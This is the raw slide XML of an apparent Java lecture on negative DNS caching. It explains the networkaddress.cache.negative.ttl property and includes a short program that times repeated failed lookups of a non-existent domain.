            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>0 = disable negative caching</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>&gt;0 = cache duration in seconds</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>-1 = cache indefinitely (not recommended)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>The following code demonstrates the use of the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>networkaddress.cache.negative.ttl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" dirty="0"/>
              <a:t> property.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>The program tests how long it takes for address1 and address2 to throw an </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>UnknownHostException</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" dirty="0"/>
              <a:t> after accessing </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>www.123456789nonexistent.com </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>(a non-existent domain name).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings 2" panose="05020102010507070707" pitchFamily="18" charset="2"/>
              <a:buNone/>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2" panose="05020102010507070707" pitchFamily="18" charset="2"/>
              <a:buNone/>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p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Rectangle 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="164812"/>
            <a:ext cx="8991600" cy="584775"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="3200" b="1" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Negative DNS Cache Configuration in Java</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="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1752601" y="990600"/>
            <a:ext cx="8424863" cy="556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defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" eaLnBrk="1" hangingPunct="1">
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="矩形 3"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="228600" y="533400"/>
            <a:ext cx="11811000" cy="6186309"/>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200" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>import java.net.*;</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import </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>java.security.Security</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pP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public class </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>NegativeDNSCacheTest</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>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public static void main(String[] </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>args</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>)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 Set negative cache TTL (in seconds)</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int </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>negativeCacheTTL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = 30; // Change this value to test different durations</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r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Security.setProperty</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>("</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>networkaddress.cache.negative.ttl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>", </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>String.valueOf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>negativeCacheTTL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>));</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String </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>invalidHost</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = "www.123456789nonexistent.com";</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r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>System.out.println</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>("Testing negative DNS cache with TTL = " + </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>negativeCacheTTL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> + "s");</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 First attempt (will fail and cache the result)</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r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>testLookup</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>invalidHost</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>, "First attempt");</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 Second attempt (will use cached failure if within TTL)</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r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>testLookup</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>invalidHost</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>, "Second attempt");</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private static void </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>testLookup</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(String hostname, String attempt)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r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>System.out.println</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>("\n" + attempt + " at " + </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>System.currentTimeMillis</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>() + "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ms</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>");</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try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long start = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>System.currentTimeMillis</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>();</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r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>InetAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>[] addresses = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>InetAddress.getAllByName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(hostname);</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r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>System.out.println</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>("Success! (should never happen with invalid host)");</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 catch (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>UnknownHostException</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> e)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long duration = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>System.currentTimeMillis</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>() - start;</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r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>System.out.println</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>("Failed as expected in " + duration + "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ms</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>");</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r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>System.out.println</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>("Exception: " + </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>e.getMessage</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>());</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    }</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="1200" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="线形标注 1 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8001000" y="647700"/>
            <a:ext cx="3824286" cy="342900"/>
          </a:xfrm>
          <a:prstGeom prst="borderCallout1">
            <a:avLst>
              <a:gd name="adj1" fmla="val 111875"/>
              <a:gd name="adj2" fmla="val 21020"/>
              <a:gd name="adj3" fmla="val 345260"/>
              <a:gd name="adj4" fmla="val -1523"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent1"/>
          </a:solidFill>
          <a:ln w="952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600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Set the property value to 30</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>seconds</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US" sz="1600" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Rectangle 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="43190"/>
            <a:ext cx="9601200" cy="584775"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="3200" b="1" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Negative DNS Cache Configuration in Java</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stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="485775" y="76200"/>
            <a:ext cx="8382000" cy="1828798"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="47107" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="57149" y="0"/>
            <a:ext cx="12011026" cy="6781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400" dirty="0"/>
              <a:t>                                                              </a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>                                                       </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Test </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>1 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>: Running results</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" eaLnBrk="1" hangingPunct="1">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" eaLnBrk="1" hangingPunct="1">
              <a:buNone/>
            </a:pPr>
